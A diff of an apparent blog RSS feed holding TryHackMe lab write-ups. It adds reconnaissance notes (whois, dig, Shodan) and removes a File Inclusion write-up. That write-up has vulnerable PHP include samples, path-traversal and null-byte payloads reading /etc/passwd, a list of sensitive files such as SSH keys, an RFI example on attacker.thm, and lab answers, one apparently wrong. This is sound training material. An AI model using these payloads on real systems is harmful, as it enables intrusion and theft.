@@ -43,6 +43,152 @@
 &lt;hr /&gt;
 
 &lt;h1 id=&quot;task-2---passive-versus-active-recon&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 - Passive Versus Active Recon&lt;/h1&gt;
+
+&lt;p&gt;In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Looking up DNS records of a domain from a public DNS server.&lt;/li&gt;
+  &lt;li&gt;Checking job ads related to the target website.&lt;/li&gt;
+  &lt;li&gt;Reading news articles about the target company.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Active reconnaissance, on the other hand, cannot be achieved so discreetly. It requires direct engagement with the target. Think of it like you check the locks on the doors and windows, among other potential entry points.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Connecting to one of the company servers such as HTTP, FTP, and SMTP.&lt;/li&gt;
+  &lt;li&gt;Calling the company in an attempt to get information (social engineering).&lt;/li&gt;
+  &lt;li&gt;Entering company premises pretending to be a repairman.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;You visit the Facebook page of the target company, hoping to get some of their employee names. What kind of reconnaissance activity is this? (A for active, P for passive)&lt;/strong&gt; Passive&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;You ping the IP address of the company webserver to check if ICMP traffic is blocked. What kind of reconnaissance activity is this? (A for active, P for passive)&lt;/strong&gt; Active&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;You happen to meet the IT administrator of the target company at a party. You try to use social engineering to get more information about their systems and network infrastructure. What kind of reconnaissance activity is this? (A for active, P for passive)&lt;/strong&gt; Active&lt;/p&gt;
+
+&lt;h1 id=&quot;task-3---whois&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 3 - Whois&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/passiverecon1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;When was TryHackMe.com registered?&lt;/strong&gt; 20180705&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the registrar of TryHackMe.com?&lt;/strong&gt; namecheap.com&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Which company is TryHackMe.com using for name servers?&lt;/strong&gt; cloudflare.com&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-4---nslookup-and-dig&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 4 - nslookup and dig&lt;/h1&gt;
+
+&lt;p&gt;Name Server Look Up (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup -type=OPTIONS DOMAIN_NAME&lt;/code&gt;) where OPTIONS is a query from the table below:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Query type&lt;/th&gt;
+      &lt;th&gt;Result&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;A&lt;/td&gt;
+      &lt;td&gt;IPv4 Addresses&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;AAAA&lt;/td&gt;
+      &lt;td&gt;IPv6 Addresses&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CNAME&lt;/td&gt;
+      &lt;td&gt;Canonical Name&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;MX&lt;/td&gt;
+      &lt;td&gt;Mail Servers&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SOA&lt;/td&gt;
+      &lt;td&gt;Start of Authority&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;TXT&lt;/td&gt;
+      &lt;td&gt;TXT Records&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Domain Information Groper (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig DOMAIN_NAME OPIONS&lt;/code&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Check the TXT records of thmlabs.com. What is the flag there?&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig thmlabs.com TXT&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nslookup -type=TXT thmlabs.com&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-5---dnsdumpster&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 5 - DNSDumpster&lt;/h1&gt;
+
+&lt;p&gt;Pretty useful took for helping map out sub domain structures and other DNS queries.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lookup tryhackme.com on DNSDumpster. What is one interesting subdomain that you would discover in addition to www and blog?&lt;/strong&gt; remote.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-6---shodanio&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 6 - Shodan.io&lt;/h1&gt;
+
+&lt;p&gt;Shodan gathers information about all devices directly connected to the Internet. If a device is directly hooked up to the Internet then Shodan queries it for various publicly-available information. The types of devices that are indexed can vary tremendously: ranging from small desktops up to nuclear power plants and everything in between.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;According to Shodan.io, what is the 2nd country in the world in terms of the number of publicly accessible Apache servers?&lt;/strong&gt; Germany&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Based on Shodan.io, what is the 3rd most common port used for Apache?&lt;/strong&gt; 8080&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Based on Shodan.io, what is the 3rd most common port used for nginx?&lt;/strong&gt; 8888&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-7---summary&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 7 - Summary&lt;/h1&gt;
+
+&lt;p&gt;We covered command-line tools, whois, nslookup, and dig. We also discussed two publicly available services DNSDumpster and Shodan.io.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Purpose&lt;/th&gt;
+      &lt;th&gt;Commandline Example&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup WHOIS record&lt;/td&gt;
+      &lt;td&gt;whois tryhackme.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS A records&lt;/td&gt;
+      &lt;td&gt;nslookup -type=A tryhackme.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS MX records at DNS server&lt;/td&gt;
+      &lt;td&gt;nslookup -type=MX tryhackme.com 1.1.1.1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS TXT records&lt;/td&gt;
+      &lt;td&gt;nslookup -type=TXT tryhackme.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS A records&lt;/td&gt;
+      &lt;td&gt;dig tryhackme.com A&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS MX records at DNS server&lt;/td&gt;
+      &lt;td&gt;dig @1.1.1.1 tryhackme.com MX&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Lookup DNS TXT records&lt;/td&gt;
+      &lt;td&gt;dig tryhackme.com TXT&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;hr /&gt;
 </description>
         <pubDate>Wed, 15 Jun 2022 00:00:00 -0700</pubDate>
         <link>http://localhost:4000//TryHackMe-Passive-Recon</link>
@@ -108,6 +254,27 @@
         <link>http://localhost:4000//TryHackMe-Burp-Suite-Extender</link>
         <link href="http://localhost:4000/TryHackMe-Burp-Suite-Extender"/>
         <guid isPermaLink="true">http://localhost:4000/TryHackMe-Burp-Suite-Extender</guid>
+      </item>
+    
+      <item>
+        <title>TryHackMe - Active Reconniassance</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/activerecon&quot;&gt;https://tryhackme.com/room/activerecon&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Learn how to use simple tools such as traceroute, ping, telnet, and a web browser to gather information.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-1---introduction&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 - Introduction&lt;/h1&gt;
+
+&lt;p&gt;Focus on active reconnaissance and the essential tools related to it. We learn to use a web browser to collect more information about our target. Moreover, we discuss using simple tools such as ping, traceroute, telnet, and nc to gather information about the network, system, and services.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+</description>
+        <pubDate>Wed, 15 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-Active-Recon</link>
+        <link href="http://localhost:4000/TryHackMe-Active-Recon"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Active-Recon</guid>
       </item>
     
       <item>
@@ -1132,343 +1299,6 @@ The vulnerable endpoint you’re targeting may not always be something you see i
         <link>http://localhost:4000//TryHackMe-IDOR</link>
         <link href="http://localhost:4000/TryHackMe-IDOR"/>
         <guid isPermaLink="true">http://localhost:4000/TryHackMe-IDOR</guid>
-      </item>
-    
-      <item>
-        <title>TryHackMe - File Inclusion</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/fileinc&quot;&gt;https://tryhackme.com/room/fileinc&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;File inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.&lt;/p&gt;
-
-&lt;h2 id=&quot;task-1-what-is-file-inclusion&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 What is File Inclusion?&lt;/h2&gt;
-
-&lt;p&gt;Information about file inclusion vulnerabilities; Local File Inclusions (LFIs), Remote File Inclusions (RFIs), and directory traversal.&lt;/p&gt;
-
-&lt;p&gt;Some web application are written to request access to files on a system, including images, static text, and so on via parameters. Parameters are query parameter string attached to the URL that could be used to retrieve data or perform actions based on user input. See pic below.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/file-incursion.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Why do File inclusion vulnerabilities happen?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and imprted, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;What is the risk of File inclusion?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;If the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as  /tmp directory, then it is possible to gain remote command execution RCE. However, it won’t be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server.&lt;/p&gt;
-
-&lt;h2 id=&quot;task-2-deploy-the-vm&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 Deploy the VM&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/file-inclusion-lab-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;task-3-path-traversal&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 3 Path Traversal&lt;/h2&gt;
-
-&lt;p&gt;Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application’s URL to locate and access files or directories stored outside the application’s root directory.&lt;/p&gt;
-
-&lt;p&gt;Path traversal vulnerabilities occur when the user’s input is passed to a function such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt; in PHP. It’s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function here.&lt;/p&gt;
-
-&lt;p&gt;The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/p&gt;
-
-&lt;p&gt;Suppose there isn’t input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As a result, the web application sends back the file’s content to the user.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://webapp.thm/get.php?file=../../../../boot.ini&lt;/code&gt; or&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:.&lt;/p&gt;
-
-&lt;p&gt;Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Location&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/etc/issue&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;contains a message or system identification to be printed before the login prompt.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/etc/profile&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;controls system-wide default variables, such as Export variables, File creation&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;mask (umask), Terminal types, Mail messages to indicate when new mail has arrived&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/proc/version&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;specifies the version of the Linux kernel&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/etc/passwd&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;has all registered user that has access to a system&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/etc/shadow&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;contains information about the system’s users’ passwords&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/root/.bash_history&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;contains the history commands for root user&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/var/log/dmessage&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;contains global system messages, including the messages that are logged during system startup&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/var/mail/root&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;all emails for root user&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/root/.ssh/id_rsa&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Private SSH keys for a root or any known valid user on the server&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;/var/log/apache2/access.log&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;the accessed requests for Apache  webserver&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;C:\boot.ini&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;contains the boot options for computers with BIOS firmware&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;What function causes path traversal vulnerabilities in PHP?&lt;/p&gt;
-
-&lt;h2 id=&quot;-task-4-local-file-inclusion---lfi&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 4 Local File Inclusion - LFI&lt;/h2&gt;
-
-&lt;p&gt;LFI attacks against web applications are often due to a developers’ lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we’ll be picking on PHP, but it’s worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.&lt;/p&gt;
-
-&lt;p&gt;In this section, we will walk you through various LFI scenarios and how to exploit them.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Suppose the web application provides two languages, and the user can select between the EN and AR&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP 
-	include($_GET[&quot;lang&quot;]);
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.&lt;/p&gt;
-
-&lt;p&gt;Theoretically, we can access and display any readable file on the server from the code above if there isn’t any input validation. Let’s say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://webapp.thm/get.php?file=/etc/passwd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;In this case, it works because there isn’t a directory specified in the include function and no input validation.&lt;/p&gt;
-
-&lt;p&gt;Now apply what we discussed and try to read /etc/passwd file. Also, answer question #1 below.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/fileinc-lab1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Next, In the following code, the developer decided to specify the directory inside the function.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP 
-	include(&quot;languages/&quot;. $_GET[&apos;lang&apos;]); 
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.&lt;/p&gt;
-
-&lt;p&gt;If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.&lt;/p&gt;
-
-&lt;p&gt;Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Now apply what we discussed, try to read files within the server, and figure out the directory specified in the include function and answer question #2 below.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Give Lab #1 a try to read /etc/passwd. What would the request URI be? /etc/passwd (easy) or ../../../etc/passwd&lt;/p&gt;
-
-&lt;p&gt;In Lab #2, what is the directory specified in the include function? ../../../../etc/passwd&lt;/p&gt;
-
-&lt;h3 id=&quot;task-5-local-file-inclusion---lfi-2&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 5 Local File Inclusion - LFI #2&lt;/h3&gt;
-
-&lt;p&gt;In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the include function.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don’t have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  include(languages/THM.php);.&lt;/p&gt;
-
-&lt;p&gt;If you look at the directory closely, we can tell the function includes files in the languages directory is adding  .php at the end of the entry. Thus the valid input will be something as follows:  index.php?lang=EN, where the file EN is located inside the given languages directory and named  EN.php.&lt;/p&gt;
-
-&lt;p&gt;Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/&lt;/p&gt;
-
-&lt;p&gt;To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let’s try the following:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:&lt;/p&gt;
-
-&lt;p&gt;Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12&lt;/p&gt;
-
-&lt;p&gt;It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.&lt;/p&gt;
-
-&lt;p&gt;Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.&lt;/p&gt;
-
-&lt;p&gt;By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:&lt;/p&gt;
-
-&lt;p&gt;include(“languages/../../../../../etc/passwd%00”).”.php”); which equivalent to → include(“languages/../../../../../etc/passwd”);&lt;/p&gt;
-
-&lt;p&gt;NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.&lt;/p&gt;
-
-&lt;p&gt;Now apply what we showed in Lab #3, and try to read files /etc/passwd, answer question #1 below.&lt;/p&gt;
-
-&lt;p&gt;In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.&lt;/p&gt;
-
-&lt;p&gt;To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that’s because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.&lt;/p&gt;
-
-&lt;p&gt;Now apply this technique in Lab #4 and figure out to read /etc/passwd.&lt;/p&gt;
-
-&lt;p&gt;Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let’s test out and check the error message!&lt;/p&gt;
-
-&lt;p&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/p&gt;
-
-&lt;p&gt;We got the following error!&lt;/p&gt;
-
-&lt;p&gt;Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15&lt;/p&gt;
-
-&lt;p&gt;If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.&lt;/p&gt;
-
-&lt;p&gt;First, we can send the following payload to bypass it: ….//….//….//….//….//etc/passwd&lt;/p&gt;
-
-&lt;p&gt;Why did this work?&lt;/p&gt;
-
-&lt;p&gt;This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn’t do another pass, leaving what is pictured below.&lt;/p&gt;
-
-&lt;p&gt;Try out Lab #5 and try to read /etc/passwd and bypass the filter!&lt;/p&gt;
-
-&lt;p&gt;Finally, we’ll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.&lt;/p&gt;
-
-&lt;p&gt;Try this out in Lab #6 and figure what the directory that has to be present in the input field is.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Give Lab #3 a try to read /etc/passwd. What is the request look like? /lab3.php?file=../../../../etc/passwd%00&lt;/p&gt;
-
-&lt;p&gt;Which function is causing the directory traversal in Lab #4? file_get_contents&lt;/p&gt;
-
-&lt;p&gt;Try out Lab #6 and check what is the directory that has to be in the input field? THM-profile&lt;/p&gt;
-
-&lt;p&gt;Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value? THM-profile/../../../../etc/os-release 12.04&lt;/p&gt;
-
-&lt;h3 id=&quot;task-6-remote-file-inclusion---rfi&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 6 Remote File Inclusion - RFI&lt;/h3&gt;
-
-&lt;p&gt;Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.&lt;/p&gt;
-
-&lt;p&gt;The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sensitive Information Disclosure&lt;/li&gt;
-  &lt;li&gt;Cross-site Scripting (XSS)&lt;/li&gt;
-  &lt;li&gt;Denial of Service (DoS)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.&lt;/p&gt;
-
-&lt;p&gt;RFI steps&lt;/p&gt;
-
-&lt;p&gt;The following figure is an example of steps for a successful RFI attack! Let’s say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP echo &quot;Hello THM&quot;; ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
